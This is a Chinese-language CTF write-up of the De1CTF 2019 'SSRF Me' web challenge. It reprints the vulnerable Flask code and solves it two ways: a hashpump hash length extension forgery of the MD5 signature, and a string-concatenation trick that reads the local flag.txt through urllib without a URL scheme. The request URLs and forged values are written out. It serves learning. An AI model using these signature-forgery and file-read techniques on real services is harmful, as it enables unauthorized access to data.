 

# BUUCTF [De1CTF 2019]SSRF Me



## 解法一 哈希拓展攻击

`secert_key` 是一个长度为 16 的字符串，在 `/geneSign?param=flag.txt` 中可以获取`hashlib.md5(secert_key + param + action).hexdigest() `，密钥param不动，增加action的内容。

* 使用 hashpump

* ```powershell
  root@DESKTOP-71UIJUJ:/home/lurenxiao/webCTF/HashPump# hashpump 
  Input Signature: 6c11de60d6c16a5eafd11a043dab6469
  Input Data: scan
  Input Key Length: 24
  Input Data to Add: read
  0b78be0ecb77afd83c52222232f4dea5
  scan\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x00\x00\x00\x00\x00\x00\x00read
  ```

* 最下面一行为action（设置时把所有 '\x' 改为 '%' 即可），倒数第二行为sign。设置cookie访问`/geneSign?param=flag.txt`

* ![](D:\CTF\ctf\web\buuctf\[De1CTF 2019]SSRF Me\图片\14.png)

## 解法二 构造字符串

### 前言

过程比较繁琐，还包含了一些我的解题想法，想直接看答案可以跳到**结果**这一章去看。

### 解题思路

BUUCTF [De1CTF 2019]SSRF Me，打开是一段python代码，手动格式化。

``` python

#! /usr/bin/env python 
# #encoding=utf-8 
from flask import Flask 
from flask import request 
import socket 
import hashlib 
import urllib 
import sys 
import os 
import json 
reload(sys) 
sys.setdefaultencoding('latin1') 
app = Flask(__name__) 
secert_key = os.urandom(16) 
class Task: 
    def __init__(self, action, param, sign, ip): 
        self.action = action 
        self.param = param 
        self.sign = sign 
        self.sandbox = md5(ip) 
        if(not os.path.exists(self.sandbox)): 
            #SandBox For Remote_Addr 
            os.mkdir(self.sandbox) 
    def Exec(self): 
        result = {} 
        result['code'] = 500 
        if (self.checkSign()): 
            if "scan" in self.action: 
                tmpfile = open("./%s/result.txt" % self.sandbox, 'w') 
                resp = scan(self.param) 
                if (resp == "Connection Timeout"): 
                    result['data'] = resp 
                else: 
                    print resp 
                    tmpfile.write(resp) 
                    tmpfile.close() 
                result['code'] = 200 
            if "read" in self.action: 
                f = open("./%s/result.txt" % self.sandbox, 'r') 
                result['code'] = 200 
                result['data'] = f.read() 
            if result['code'] == 500: 
                result['data'] = "Action Error" 
        else: 
            result['code'] = 500 
            result['msg'] = "Sign Error" 
        return result 
    def checkSign(self): 
        if (getSign(self.action, self.param) == self.sign): 
            return True 
        else: 
            return False 
#generate Sign For Action Scan. 
@app.route("/geneSign", methods=['GET', 'POST']) 
def geneSign(): 
    param = urllib.unquote(request.args.get("param", "")) 
    action = "scan" 
    return getSign(action, param) 
@app.route('/De1ta',methods=['GET','POST']) 
def challenge(): 
    action = urllib.unquote(request.cookies.get("action")) 
    param = urllib.unquote(request.args.get("param", "")) 
    sign = urllib.unquote(request.cookies.get("sign")) 
    ip = request.remote_addr 
    if(waf(param)):
        return "No Hacker!!!!" 
    task = Task(action, param, sign, ip)
    return json.dumps(task.Exec()) 
@app.route('/') 
def index(): 
    return open("code.txt","r").read() 
def scan(param): 
    socket.setdefaulttimeout(1) 
    try: 
        return urllib.urlopen(param).read()[:50] 
    except: 
        return "Connection Timeout" 
def getSign(action, param): 
    return hashlib.md5(secert_key + param + action).hexdigest() 
def md5(content): 
    return hashlib.md5(content).hexdigest() 
def waf(param): 
    check=param.strip().lower() 
    if check.startswith("gopher") or check.startswith("file"): 
        return True 
    else: 
        return False 
if __name__ == '__main__': 
    app.debug = False 
    app.run(host='0.0.0.0',port=80)
```

有三个uri

* /geneSign
* /
* /De1ta

flag保存在了**./flag.txt**

geneSign生成签名，challenge验证签名通过action执行操作，scan利用urllib.urlopen(param)获取数据保存到result.txt，read获取result.txt的内容显示。

先访问geneSign获取签名。然后用editthiscookie设置网页cookie值，访问De1ta，通过scan保存文件，read读取内容。

### 过程

这里我们先不设置cookie访问一遍看是什么效果

![](D:\CTF\ctf\web\buuctf\[De1CTF 2019]SSRF Me\图片\2.png)

应该是request.cookies.get的时候出错了，这个时候想action cookie没设，可以用editthiscookie设置cookie，但是要知道sign的值，task是通过checkSign验证签名，checkSign调用getSign。getSign里有个secert_key，secert_key是初始化的时候系统随机的os.urandom(16) ，所以查getSign还在哪调用。

getSign在/geneSign里也用了，所以我们可以先访问getSign获取sign。

![](D:\CTF\ctf\web\buuctf\[De1CTF 2019]SSRF Me\图片\3.png)

这个时候设置cookie（action=scan,sign=0e5aedec26dae45a34faa23d8fcd219b）访问看看

![](D:\CTF\ctf\web\buuctf\[De1CTF 2019]SSRF Me\图片\4.png)

看到action=scan要用scan这个函数，要求一个param参数

``` python
def scan(param): 
    socket.setdefaulttimeout(1) 
    try: 
        return urllib.urlopen(param).read()[:50] 
    except: 
        return "Connection Timeout" 
```

这个param由/De1ta从url参数中获取，并且有一个waf函数，过滤所有以"gopher"和"file"开头的param。这个时候想到可以通过urllib.urlopen(param)来打开./flag.txt。

查看[python官方文档](https://docs.python.org/2/library/urllib.html)，看看有没有什么可以绕过的方法。

![](D:\CTF\ctf\web\buuctf\[De1CTF 2019]SSRF Me\图片\5.png)

注意这句话

> Open a network object denoted by a URL for reading. **If the URL does not have a scheme identifier, or if it has `file:` as its scheme identifier, this opens a local file (without [universal newlines](https://docs.python.org/2/glossary.html#term-universal-newlines));** otherwise it opens a socket to a server somewhere on the network.

所以我们可以直接用param=flag.txt打开./flag.txt读取flag

#### 尝试

先试一下

``` http
http://3f668dc5-4224-455d-9406-172977048bf6.node3.buuoj.cn/geneSign?param=flag.txt
```

![](D:\CTF\ctf\web\buuctf\[De1CTF 2019]SSRF Me\图片\6.png)

设置cookie

<img src="D:\CTF\ctf\web\buuctf\[De1CTF 2019]SSRF Me\图片\9.png" style="zoom: 67%;" />

![](D:\CTF\ctf\web\buuctf\[De1CTF 2019]SSRF Me\图片\8.png)

访问

``` http
http://3f668dc5-4224-455d-9406-172977048bf6.node3.buuoj.cn/De1ta?param=flag.txt
```

这个时候flag肯定已经保存到`"./%s/result.txt" % self.sandbox` 这个文件里了

![](D:\CTF\ctf\web\buuctf\[De1CTF 2019]SSRF Me\图片\7.png)

我想通过action="read"读，所以设置cookie中的action=read

访问

``` http
http://3f668dc5-4224-455d-9406-172977048bf6.node3.buuoj.cn/De1ta?param=flag.txt
```

![](D:\CTF\ctf\web\buuctf\[De1CTF 2019]SSRF Me\图片\10.png)

诶，怎么有点不对，继续看代码

``` python
def Exec(self): 
    result = {} 
    result['code'] = 500 
    if (self.checkSign()): 
        if "scan" in self.action: 
            tmpfile = open("./%s/result.txt" % self.sandbox, 'w') 
            resp = scan(self.param) 
            if (resp == "Connection Timeout"): 
                result['data'] = resp 
            else: 
                print resp 
                tmpfile.write(resp) 
                tmpfile.close() 
            result['code'] = 200 
        if "read" in self.action: 
            f = open("./%s/result.txt" % self.sandbox, 'r') 
            result['code'] = 200 
            result['data'] = f.read() 
        if result['code'] == 500: 
            result['data'] = "Action Error" 
    else: 
        result['code'] = 500 
        result['msg'] = "Sign Error" 
    return result 
def checkSign(self): 
    if (getSign(self.action, self.param) == self.sign): 
        return True 
    else: 
        return False 
@app.route("/geneSign", methods=['GET', 'POST']) 
def geneSign(): 
    param = urllib.unquote(request.args.get("param", "")) 
    action = "scan" 
    return getSign(action, param) 
def getSign(action, param): 
    return hashlib.md5(secert_key + param + action).hexdigest() 
```

发现我们通过geneSign获取sign时，geneSign设置action="scan"。访问/De1ta时我们想获取flag只能action="read"。这个时候我看到，当action="read"时，param是未在主逻辑中使用，但是在checkSign的时候却需要用到，而geneSign的param就纯用来生成签名，这不是暗示我可以构造param来绕过这一波逻辑直达action="read"吗？

这个时候想构造的这个param，能让action="scan"的时候生成的 sign 可以在访问/De1ta，action="read"的时候通过验证。

### 结果

``` python
def getSign(action, param): 
    return hashlib.md5(secert_key + param + action).hexdigest() 
```

action在param后边，我们注意在/De1ta里判断action使用的是 in 。

设置 **`param=flag.txtread`**  就可以让生成的时候

param + action为flag.txtreadscan

``` http
http://3f668dc5-4224-455d-9406-172977048bf6.node3.buuoj.cn/geneSign?param=flag.txtread
```

![](D:\CTF\ctf\web\buuctf\[De1CTF 2019]SSRF Me\图片\11.png)

设置 **`action=readscan`**、**`param=flag.txt`**

param + action也为flag.txtreadscan

就可以通过scan设置result.txt为flag.txt的内容，read读取到flag.txt的内容。

设置sign为刚才查到的sign。

<img src="D:\CTF\ctf\web\buuctf\[De1CTF 2019]SSRF Me\图片\readscan.png" style="zoom:67%;" />

<img src="D:\CTF\ctf\web\buuctf\[De1CTF 2019]SSRF Me\图片\readscansign.png" style="zoom:67%;" />

访问

``` http
http://3f668dc5-4224-455d-9406-172977048bf6.node3.buuoj.cn/De1ta?param=flag.txt
```

获得flag

![](D:\CTF\ctf\web\buuctf\[De1CTF 2019]SSRF Me\图片\13.png)

## 参考

[De1CTF ssrf_me 的三种解法](https://xz.aliyun.com/t/5927)

[Hash Length Extension Attack](https://joychou.org/web/hash-length-extension-attack.html)